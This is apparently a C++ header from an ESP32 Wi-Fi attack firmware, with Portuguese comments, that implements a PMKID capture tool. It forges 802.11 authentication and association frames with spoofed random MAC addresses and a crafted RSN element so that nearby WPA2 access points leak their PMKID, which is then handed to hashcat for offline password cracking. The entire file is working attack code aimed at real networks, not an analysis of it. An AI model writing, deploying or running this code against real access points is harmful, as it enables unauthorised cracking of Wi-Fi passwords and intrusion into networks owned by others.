#pragma once
#include <Arduino.h>
#include <esp_wifi.h>
#include <vector>
#include <algorithm>
#include "../utils/logger.h"
#include "sniffer.h"

/*
 * PMKID Fisher — captura PMKIDs sem clientes conectados
 *
 * Fluxo: Auth Request → Assoc Request (com RSN IE WPA2) → AP envia EAPOL M1
 * contendo o PMKID. O sniffer em modo promíscuo captura o EAPOL M1 e extrai o
 * PMKID para cracking offline com hashcat -m 22000.
 */
class PMKIDFisher {
public:
    static PMKIDFisher& get() { static PMKIDFisher inst; return inst; }

    bool     running   = false;
    uint32_t attempts  = 0;
    uint32_t captured  = 0;

    struct Target {
        uint8_t bssid[6];
        char    ssid[33];
        uint8_t channel;
        int8_t  rssi      = -100;
        uint8_t attempts  = 0;    // tentativas realizadas
        bool    captured  = false; // PMKID capturado para este alvo
    };
    std::vector<Target> targets;

    void addTarget(const uint8_t* bssid, const char* ssid, uint8_t ch, int8_t rssi = -100) {
        // Não duplicar
        for (auto& t : targets)
            if (memcmp(t.bssid, bssid, 6) == 0) return;
        Target t;
        memcpy(t.bssid, bssid, 6);
        strncpy(t.ssid, ssid, 32);
        t.ssid[32] = 0;
        t.channel  = ch;
        t.rssi     = rssi;
        targets.push_back(t);
    }

    void clearTargets() { targets.clear(); }

    void start() {
        if (targets.empty()) { LOG.warn("[PMKID FISHER] Nenhum alvo adicionado"); return; }
        if (!Sniffer::get().running) Sniffer::get().start();
        // Ordena alvos por RSSI (mais próximos primeiro = maior chance)
        std::sort(targets.begin(), targets.end(),
            [](const Target& a, const Target& b){ return a.rssi > b.rssi; });
        running  = true;
        attempts = 0;
        captured = 0;
        LOG.warn("[PMKID FISHER] Iniciado — " + String(targets.size()) + " alvo(s) ordenados por RSSI");
    }

    void stop() {
        running = false;
        LOG.info("[PMKID FISHER] Parado | tentativas:" + String(attempts) +
                 " capturados:" + String(captured));
    }

    // Chamado no attackTask a cada iteração — sem delay() bloqueante
    void tick() {
        if (!running || targets.empty()) return;

        unsigned long now = millis();

        // Sub-estados para Auth→Assoc sem bloquear a task
        switch (_ss) {
            case SS_IDLE: {
                if (now < _nextAt) return;
                // Busca próximo alvo não capturado
                size_t tried = 0;
                while (tried < targets.size()) {
                    Target& t = targets[_idx % targets.size()];
                    _idx++; tried++;
                    String bs = Deauther::bssidStr(t.bssid);
                    for (auto& p : Sniffer::get().pmkids)
                        if (p.bssid == bs) { t.captured = true; break; }
                    if (!t.captured) {
                        _curIdx = (_idx - 1) % targets.size();
                        esp_fill_random(_fakeMac, 6);
                        _fakeMac[0] = (_fakeMac[0] | 0x02) & 0xFE;
                        esp_wifi_set_channel(t.channel, WIFI_SECOND_CHAN_NONE);
                        _sendAuthRequest(t.bssid, _fakeMac);
                        _ss = SS_WAIT_AUTH;
                        _ssTimer = now;
                        return;
                    }
                }
                // Todos capturados
                bool allDone = true;
                for (auto& t : targets) if (!t.captured) { allDone = false; break; }
                if (allDone) {
                    running = false;
                    LOG.success("[PMKID FISHER] Todos capturados! PMKIDs=" + String(captured));
                }
                break;
            }
            case SS_WAIT_AUTH:
                if (now - _ssTimer < 20) return;
                _sendAssocRequest(targets[_curIdx].bssid, _fakeMac, targets[_curIdx].ssid);
                _ss = SS_WAIT_EAPOL;
                _ssTimer = now;
                break;

            case SS_WAIT_EAPOL:
                if (now - _ssTimer < 80) return;
                {
                    Target& t = targets[_curIdx];
                    t.attempts++;
                    attempts++;
                    captured = (uint32_t)Sniffer::get().pmkids.size();
                    if (t.attempts % 5 == 1)
                        LOG.data("[PMKID FISHER] #" + String(t.attempts) + " -> " +
                                 Deauther::bssidStr(t.bssid) + " (rssi=" + String(t.rssi) + ")");
                    // Enviar 3 pares Auth+Assoc com MACs diferentes antes de pausar
                    for (int rep = 1; rep < 3; rep++) {
                        uint8_t m[6]; esp_fill_random(m, 6);
                        m[0] = (m[0] | 0x02) & 0xFE;
                        _sendAuthRequest(t.bssid, m);
                        delayMicroseconds(800);
                        _sendAssocRequest(t.bssid, m, t.ssid);
                        delayMicroseconds(800);
                    }
                    uint32_t wait = (t.rssi > -60) ? 180 : (t.rssi > -75) ? 280 : 420;
                    _nextAt = now + wait;
                    _ss = SS_IDLE;
                }
                break;
        }
    }

private:
    enum SubState { SS_IDLE, SS_WAIT_AUTH, SS_WAIT_EAPOL };
    SubState      _ss      = SS_IDLE;
    unsigned long _ssTimer = 0;
    unsigned long _nextAt  = 0;
    size_t        _idx     = 0;
    size_t        _curIdx  = 0;
    uint8_t       _fakeMac[6] = {};

    void _sendAuthRequest(const uint8_t* ap, const uint8_t* sta) {
        uint8_t f[30] = {};
        f[0] = 0xB0; f[1] = 0x00;  // Auth Request
        f[2] = 0x3A; f[3] = 0x01;  // Duration
        memcpy(f +  4, ap,  6);     // DA
        memcpy(f + 10, sta, 6);     // SA
        memcpy(f + 16, ap,  6);     // BSSID
        f[22] = 0x00; f[23] = 0x00; // Seq
        f[24] = 0x00; f[25] = 0x00; // Auth Alg: Open System
        f[26] = 0x01; f[27] = 0x00; // Auth Seq: 1
        f[28] = 0x00; f[29] = 0x00; // Status: Success
        esp_wifi_80211_tx(WIFI_IF_AP, f, 30, false);
    }

    void _sendAssocRequest(const uint8_t* ap, const uint8_t* sta, const char* ssid) {
        uint8_t buf[128] = {};
        int pos = 0;

        // Fixed header (24 bytes)
        buf[pos++] = 0x00; buf[pos++] = 0x00; // FC: Assoc Req
        buf[pos++] = 0x3A; buf[pos++] = 0x01; // Duration
        memcpy(buf + pos, ap,  6); pos += 6;   // DA
        memcpy(buf + pos, sta, 6); pos += 6;   // SA
        memcpy(buf + pos, ap,  6); pos += 6;   // BSSID
        buf[pos++] = 0x00; buf[pos++] = 0x00;  // Seq

        // Body
        buf[pos++] = 0x31; buf[pos++] = 0x04;  // Capabilities: ESS+ShortSlot
        buf[pos++] = 0x0A; buf[pos++] = 0x00;  // Listen interval

        // SSID IE
        uint8_t slen = strlen(ssid);
        buf[pos++] = 0x00;   // SSID tag
        buf[pos++] = slen;
        memcpy(buf + pos, ssid, slen); pos += slen;

        // Supported Rates
        static const uint8_t rates[] = {0x01,0x08,0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24};
        memcpy(buf + pos, rates, sizeof(rates)); pos += sizeof(rates);

        // Extended Supported Rates
        static const uint8_t extRates[] = {0x32,0x04,0x30,0x48,0x60,0x6C};
        memcpy(buf + pos, extRates, sizeof(extRates)); pos += sizeof(extRates);

        // RSN IE (WPA2-PSK CCMP) — essencial para AP enviar EAPOL M1 com PMKID
        // PMKIDCount=0 obrigatório: APs Cisco/Mikrotik rejeitam sem este campo
        static const uint8_t rsn[] = {
            0x30, 0x16,             // RSN IE tag=0x30, len=22
            0x01, 0x00,             // Version 1
            0x00, 0x0F, 0xAC, 0x04, // Group cipher: CCMP
            0x01, 0x00,             // Pairwise count: 1
            0x00, 0x0F, 0xAC, 0x04, // Pairwise: CCMP
            0x01, 0x00,             // AKM count: 1
            0x00, 0x0F, 0xAC, 0x02, // AKM: PSK
            0x00, 0x00,             // RSN Capabilities: 0 (sem PMF, sem 11w)
            0x00, 0x00,             // PMKIDCount: 0 (pede ao AP que inclua PMKID no M1)
        };
        memcpy(buf + pos, rsn, sizeof(rsn)); pos += sizeof(rsn);

        esp_wifi_80211_tx(WIFI_IF_AP, buf, pos, false);
    }
};
